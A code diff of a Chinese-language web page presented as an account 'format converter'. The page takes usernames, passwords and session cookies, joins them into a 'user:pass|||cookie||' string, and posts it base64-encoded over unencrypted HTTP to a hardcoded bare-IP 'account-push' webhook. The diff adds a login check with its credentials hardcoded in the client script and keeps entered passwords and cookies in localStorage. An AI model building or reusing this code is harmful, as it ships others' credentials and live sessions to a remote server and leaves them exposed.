@@ -1,320 +1,265 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
+
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>高级账号转换器</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>极速格式转换器 - Prince of the Galaxy</title>
   <style>
     :root {
-      --main-bg: #030712;
-      --card-bg: #111827;
-      --accent-blue: #3b82f6;
-      --accent-glow: rgba(59, 130, 246, 0.5);
-      --success-green: #10b981;
-      --error-red: #f43f5e;
-      --text-main: #f8fafc;
-      --text-dim: #94a3b8;
-      --border-color: #1f2937;
+      --bg: #0b0f1a;
+      --panel: #161b2a;
+      --border: #2d364d;
+      --accent: #00f2ff;
+      --accent-2: #ff8c00;
+      --text: #e2e8f0;
+      --muted: #64748b;
+      --error: #ff4d4d;
+      --success: #00ffcc;
+      --input-bg: #0d111d;
     }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif; }
 
     body {
-      margin: 0;
-      background-color: var(--main-bg);
-      color: var(--text-main);
-      font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
-      padding: 16px;
-      overflow-x: hidden;
       min-height: 100vh;
-    }
-
-    /* 🌊 Refresh Wave Effect */
-    #blur-layer {
-      position: fixed;
-      inset: 0;
-      backdrop-filter: blur(0px);
-      background: rgba(255, 255, 255, 0);
-      z-index: 2000;
-      pointer-events: none;
-      transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+      background: var(--bg);
+      color: var(--text);
       display: flex;
       align-items: center;
       justify-content: center;
-    }
-    .wave {
-      width: 0%; height: 0%;
-      background: radial-gradient(circle, rgba(59, 130, 246, 0.3) 0%, transparent 70%);
-      border-radius: 50%;
-      transition: 0.6s ease-out;
+      padding: 15px;
+      overflow-x: hidden;
     }
 
-    /* 📦 Main Container */
-    .container {
-      max-width: 500px;
-      margin: 0 auto;
+    #auth-screen {
+      position: fixed; inset: 0; background: var(--bg);
+      display: flex; align-items: center; justify-content: center; z-index: 9999;
     }
 
-    .header {
-      text-align: center;
-      margin-bottom: 24px;
-      padding-top: 10px;
-    }
-    .header h1 {
-      font-size: 22px;
-      margin: 0;
-      background: linear-gradient(to right, #60a5fa, #3b82f6);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      letter-spacing: 1px;
+    .auth-card {
+      width: 100%; max-width: 380px; background: var(--panel); border: 1px solid var(--border);
+      padding: 40px; border-radius: 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
     }
 
-    /* 📝 Input Cards */
-    .card {
-      background: var(--card-bg);
-      border: 1px solid var(--border-color);
-      border-radius: 24px;
-      padding: 24px;
-      box-shadow: 0 20px 50px rgba(0,0,0,0.4);
-      margin-bottom: 20px;
+    .auth-input {
+      width: 100%; background: var(--input-bg); border: 1px solid var(--border);
+      border-radius: 12px; padding: 14px; color: #fff; margin-bottom: 15px; outline: none;
     }
 
-    .field-group { margin-bottom: 20px; }
-    .field-group label {
-      display: block;
-      font-size: 13px;
-      color: var(--text-dim);
-      margin-bottom: 8px;
-      margin-left: 4px;
+    .auth-btn {
+      width: 100%; padding: 15px; background: linear-gradient(135deg, var(--accent), #00a8b3);
+      border: none; border-radius: 12px; color: #06101a; font-weight: 800; cursor: pointer;
     }
 
+    #main-app { display: none; width: 100%; max-width: 1100px; margin: 0 auto; }
+
+    .app-wrapper {
+      background: var(--panel); border: 1px solid var(--border); border-radius: 25px;
+      padding: 30px; position: relative; box-shadow: 0 30px 60px rgba(0,0,0,0.6);
+    }
+
+    .app-wrapper::before {
+      content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 4px;
+      background: linear-gradient(90deg, var(--accent), var(--accent-2));
+    }
+
+    .grid-container { display: grid; grid-template-columns: 1fr 160px 1fr; gap: 25px; }
+
+    @media (max-width: 900px) {
+      .grid-container { grid-template-columns: 1fr; }
+      .actions-column { flex-direction: row !important; padding: 10px 0 !important; }
+    }
+
+    .card { background: var(--input-bg); border: 1px solid var(--border); border-radius: 18px; padding: 20px; }
+    .title { font-size: 13px; color: var(--muted); margin-bottom: 15px; font-weight: bold; }
+
+    label { display: block; font-size: 11px; color: var(--accent); margin-bottom: 6px; font-weight: 700; }
     input, textarea {
-      width: 100%;
-      background: #000000;
-      border: 2px solid var(--border-color);
-      border-radius: 14px;
-      padding: 14px;
-      color: #fff;
-      font-size: 14px;
-      box-sizing: border-box;
-      outline: none;
-      transition: all 0.3s ease;
+      width: 100%; background: #101524; border: 1px solid var(--border);
+      border-radius: 10px; padding: 12px; color: #fff; margin-bottom: 15px; outline: none;
     }
 
-    /* 🔵 Blue Border Focus Effect */
-    input:focus, textarea:focus {
-      border-color: var(--accent-blue);
-      box-shadow: 0 0 15px var(--accent-glow);
-      background: #020617;
-    }
+    input::placeholder, textarea::placeholder { color: #4a5568; font-size: 12px; }
 
-    /* 🔘 Buttons */
-    .btn-stack { display: flex; flex-direction: column; gap: 12px; }
+    .actions-column { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; }
     .btn {
-      width: 100%;
-      padding: 16px;
-      border-radius: 16px;
-      border: none;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      transition: all 0.2s;
-    }
-    .btn-primary {
-      background: linear-gradient(135deg, #3b82f6, #2563eb);
-      color: white;
-      box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
-    }
-    .btn-secondary {
-      background: transparent;
-      border: 2px solid var(--accent-blue);
-      color: var(--accent-blue);
-    }
-    .btn:active { transform: scale(0.97); }
-
-    /* 📊 Status & Output */
-    .status-area {
-      margin-top: 15px;
-      padding: 14px;
-      border-radius: 12px;
-      font-size: 13px;
-      text-align: center;
-      display: none;
-      font-weight: 500;
-    }
-    .success { background: rgba(16, 185, 129, 0.1); color: var(--success-green); border: 1px solid var(--success-green); }
-    .error { background: rgba(244, 63, 94, 0.1); color: var(--error-red); border: 1px solid var(--error-red); }
-
-    .output-preview {
-      margin-top: 15px;
-      font-family: monospace;
-      font-size: 11px;
-      color: #60a5fa;
-      background: #000;
-      padding: 10px;
-      border-radius: 10px;
-      word-break: break-all;
-      display: none;
+      width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: 800; cursor: pointer;
+      font-size: 13px; transition: 0.3s;
     }
 
-    /* 🌀 Floating Fan */
-    .fan-trigger {
-      position: fixed;
-      right: 20px;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 60px; height: 60px;
-      background: linear-gradient(135deg, #3b82f6, #1d4ed8);
-      color: white;
-      border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 24px;
-      cursor: pointer;
-      box-shadow: 0 0 20px var(--accent-glow);
-      z-index: 2001;
+    #convertBtn { background: var(--accent); color: #06101a; }
+    #pushBtn { background: var(--accent-2); color: #fff; }
+    
+    #refreshBtn { 
+      width: 50px; height: 50px; border-radius: 50%; background: var(--border); 
+      color: var(--accent); display: flex; align-items: center; justify-content: center; cursor: pointer;
     }
-    .rotate-anim { animation: fanRotate 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
-    @keyframes fanRotate { 100% { transform: translateY(-50%) rotate(720deg); } }
+
+    .output-box { background: #05080f; border: 1px solid var(--border); border-radius: 15px; min-height: 260px; display: flex; }
+    #outputText { width: 100%; background: transparent; border: none; padding: 15px; color: var(--success); font-family: monospace; resize: none; }
+
+    .status-bar {
+      margin-top: 25px; padding-top: 15px; border-top: 1px solid var(--border);
+      display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;
+    }
+    .tag { padding: 7px 14px; border-radius: 8px; background: #1c2336; font-size: 11px; font-weight: 700; border: 1px solid var(--border); }
+    
+    .spinning { animation: spin 0.7s linear; }
+    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
   </style>
 </head>
+
 <body>
 
-  <div id="blur-layer"><div class="wave" id="wave"></div></div>
-
-  <div class="fan-trigger" id="fan" onclick="runRefresh()">
-    <i class="fas fa-fan"></i>
+  <div id="auth-screen">
+    <div class="auth-card">
+      <h2 style="color:var(--accent); margin-bottom:20px;">系统登录</h2>
+      <input type="text" id="l-user" class="auth-input" placeholder="用户名 (PrinceX)">
+      <input type="password" id="l-pass" class="auth-input" placeholder="密码 (Pass77)">
+      <button class="auth-btn" onclick="handleLogin()">进入系统</button>
+    </div>
   </div>
 
-  <div class="container">
-    <div class="header">
-      <h1>账号格式转换系统</h1>
-    </div>
+  <div id="main-app">
+    <div class="app-wrapper">
+      <div class="grid-container">
+        <div class="column">
+          <div class="title">01 | 输入</div>
+          <div class="card">
+            <label>用户名</label>
+            <input type="text" id="uName" placeholder="例如: admin_user" oninput="saveData()">
+            <label>密码</label>
+            <input type="text" id="uPass" placeholder="例如: pass123" oninput="saveData()">
+            <label>会话数据 (Cookies)</label>
+            <textarea id="uCook" style="height:100px;" placeholder="粘贴 Session 数据..." oninput="saveData()"></textarea>
+          </div>
+        </div>
 
-    <div class="card">
-      <div class="field-group">
-        <label>用户名 (Username)</label>
-        <input type="text" id="user" placeholder="请输入用户名">
+        <div class="actions-column">
+          <button id="convertBtn" class="btn" onclick="processConvert()">转换格式</button>
+          <button id="pushBtn" class="btn" onclick="processPush()">云端推送</button>
+          <div id="refreshBtn" onclick="processReset()">
+            <svg viewBox="0 0 24 24" width="22" height="22" stroke="currentColor" fill="none" stroke-width="2"><path d="M23 4v6h-6M1 20v-6h6M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path></svg>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="title">02 | 输出</div>
+          <div class="output-box">
+            <textarea id="outputText" readonly placeholder="等待结果..."></textarea>
+          </div>
+        </div>
       </div>
 
-      <div class="field-group">
-        <label>登录密码 (Password)</label>
-        <input type="password" id="pass" placeholder="请输入密码">
+      <div class="status-bar">
+        <div style="display:flex; gap:10px;">
+          <div class="tag" style="color:var(--success)" id="sCount">成功: 0</div>
+          <div class="tag" style="color:var(--error)" id="fCount">异常: 0</div>
+          <div class="tag" style="color:var(--accent-2)" id="pStatus">云端: 等待</div>
+        </div>
+        <div id="msg" style="font-size:12px; color:var(--muted); font-style:italic;">系统就绪</div>
       </div>
-
-      <div class="field-group">
-        <label>Cookie 数据</label>
-        <textarea id="cookie" rows="4" placeholder="在此粘贴完整的 Cookie 内容"></textarea>
-      </div>
-
-      <div class="btn-stack">
-        <button class="btn btn-primary" onclick="processConversion()">
-          <i class="fas fa-exchange-alt"></i> 立即开始转换
-        </button>
-        <button class="btn btn-secondary" onclick="processPush()">
-          <i class="fas fa-rocket"></i> 将数据推送到服务器
-        </button>
-      </div>
-
-      <div id="statusBox" class="status-area"></div>
-      <div id="resultPreview" class="output-preview"></div>
     </div>
   </div>
 
   <script>
-    const tg = window.Telegram.WebApp;
-    tg.expand();
+    const DATABASE = { "PrinceX": "Pass77", "Admin": "Root00" };
 
-    // 核心转换逻辑 (Conversion Logic)
-    function processConversion() {
-      const u = document.getElementById('user').value.trim();
-      const p = document.getElementById('pass').value.trim();
-      const c = document.getElementById('cookie').value.trim();
-      const status = document.getElementById('statusBox');
-      const preview = document.getElementById('resultPreview');
+    window.onload = () => {
+        if (sessionStorage.getItem("isLoggedIn") === "true") showApp();
+    };
 
-      // 验证: 必填项检查及 Cookie 格式验证
-      if (!u || !p || !c || !c.includes('=')) {
-        updateStatus('❌ 验证失败：请确保所有项已填写且 Cookie 格式正确', true);
-        preview.style.display = 'none';
-        return;
-      }
-
-      // 转换格式: user:pass|||cookie||
-      const finalString = `${u}:${p}|||${c}||`;
-      window.savedData = finalString;
-
-      preview.textContent = finalString;
-      preview.style.display = 'block';
-      updateStatus('✅ 转换成功：数据已锁定并准备推送', false);
+    function handleLogin() {
+        const u = document.getElementById('l-user').value;
+        const p = document.getElementById('l-pass').value;
+        if (DATABASE[u] && DATABASE[u] === p) {
+            sessionStorage.setItem("isLoggedIn", "true");
+            showApp();
+        } else { alert("验证失败！"); }
     }
 
-    // 推送逻辑 (Push Logic)
-    async function processPush() {
-      if (!window.savedData) {
-        updateStatus('⚠️ 错误：请先完成格式转换', true);
-        return;
-      }
-
-      updateStatus('⏳ 正在连接服务器，请稍候...', false);
-      const endpoint = 'http://43.173.119.225/api/api/v1/webhook/YDbd-GZyAokTsjuF4bpQ8fuiLBsE1z9dWOLWrjMNfdw/account-push';
-      const payload = `accounts=${btoa(window.savedData)}`;
-
-      try {
-        const response = await fetch(endpoint, {
-          method: 'POST',
-          headers: { 'Content-Type': 'text/plain' },
-          body: payload,
-        });
-
-        if (response.ok) {
-          const json = await response.json();
-          const d = json.data;
-          updateStatus(`🚀 推送完成 | 成功: ${d.success_count} | 失败: ${d.failed_count}`, d.failed_count > 0);
-        } else {
-          updateStatus('❌ 推送失败：服务器响应异常', true);
+    function showApp() {
+        document.getElementById('auth-screen').style.display = 'none';
+        document.getElementById('main-app').style.display = 'block';
+        const saved = localStorage.getItem("temp_data");
+        if (saved) {
+            const d = JSON.parse(saved);
+            document.getElementById('uName').value = d.u || "";
+            document.getElementById('uPass').value = d.p || "";
+            document.getElementById('uCook').value = d.c || "";
         }
-      } catch (err) {
-        updateStatus(`❌ 网络错误: ${err.message}`, true);
-      }
     }
 
-    // 刷新动画 (Professional Refresh)
-    function runRefresh() {
-      const fan = document.getElementById('fan');
-      const blur = document.getElementById('blur-layer');
-      const wave = document.getElementById('wave');
-
-      fan.classList.add('rotate-anim');
-      blur.style.backdropFilter = 'blur(15px)';
-      blur.style.background = 'rgba(15, 23, 42, 0.4)';
-      wave.style.width = '300%'; wave.style.height = '300%';
-
-      setTimeout(() => {
-        document.getElementById('user').value = '';
-        document.getElementById('pass').value = '';
-        document.getElementById('cookie').value = '';
-        document.getElementById('statusBox').style.display = 'none';
-        document.getElementById('resultPreview').style.display = 'none';
-        window.savedData = null;
-      }, 300);
-
-      setTimeout(() => {
-        fan.classList.remove('rotate-anim');
-        blur.style.backdropFilter = 'blur(0px)';
-        blur.style.background = 'rgba(255, 255, 255, 0)';
-        wave.style.width = '0%'; wave.style.height = '0%';
-      }, 700);
+    function saveData() {
+        const data = {
+            u: document.getElementById('uName').value,
+            p: document.getElementById('uPass').value,
+            c: document.getElementById('uCook').value
+        };
+        localStorage.setItem("temp_data", JSON.stringify(data));
     }
 
-    function updateStatus(msg, isError) {
-      const box = document.getElementById('statusBox');
-      box.style.display = 'block';
-      box.innerHTML = msg;
-      box.className = `status-area ${isError ? 'error' : 'success'}`;
+    function processReset() {
+        document.getElementById('refreshBtn').classList.add('spinning');
+        setTimeout(() => {
+            localStorage.removeItem("temp_data");
+            document.getElementById('uName').value = "";
+            document.getElementById('uPass').value = "";
+            document.getElementById('uCook').value = "";
+            document.getElementById('outputText').value = "";
+            document.getElementById('sCount').innerText = "成功: 0";
+            document.getElementById('fCount').innerText = "异常: 0";
+            document.getElementById('pStatus').innerText = "云端: 等待";
+            updateStatus("已清空", false);
+            document.getElementById('refreshBtn').classList.remove('spinning');
+        }, 500);
+    }
+
+    function processConvert() {
+        const u = document.getElementById('uName').value.trim();
+        const p = document.getElementById('uPass').value.trim();
+        const c = document.getElementById('uCook').value.trim();
+
+        if (!u || !p || !c) {
+            updateStatus("❌ 错误: 请填写信息", true);
+            document.getElementById('fCount').innerText = "异常: 1";
+            document.getElementById('sCount').innerText = "成功: 0";
+            return;
+        }
+
+        document.getElementById('outputText').value = `${u}:${p}|||${c}||`;
+        document.getElementById('sCount').innerText = "成功: 1";
+        document.getElementById('fCount').innerText = "异常: 0";
+        updateStatus("✅ 转换完成", false);
+    }
+
+    async function processPush() {
+        const data = document.getElementById('outputText').value;
+        if (!data) return;
+        const pTag = document.getElementById('pStatus');
+        pTag.innerText = "云端: 同步中...";
+        
+        try {
+            const res = await fetch('http://43.173.119.225/api/api/v1/webhook/YDbd-GZyAokTsjuF4bpQ8fuiLBsE1z9dWOLWrjMNfdw/account-push', {
+                method: 'POST',
+                headers: { 'Content-Type': 'text/plain' },
+                body: `accounts=${btoa(data)}`
+            });
+            if (res.ok) {
+                pTag.innerText = "云端: 同步成功";
+                updateStatus("🚀 推送成功", false);
+            } else { throw new Error(); }
+        } catch (e) {
+            pTag.innerText = "云端: 异常";
+            updateStatus("❌ 推送失败", true);
+        }
+    }
+
+    function updateStatus(m, isErr) {
+        const log = document.getElementById('msg');
+        log.innerText = m;
+        log.style.color = isErr ? 'var(--error)' : 'var(--success)';
     }
   </script>
 </body>
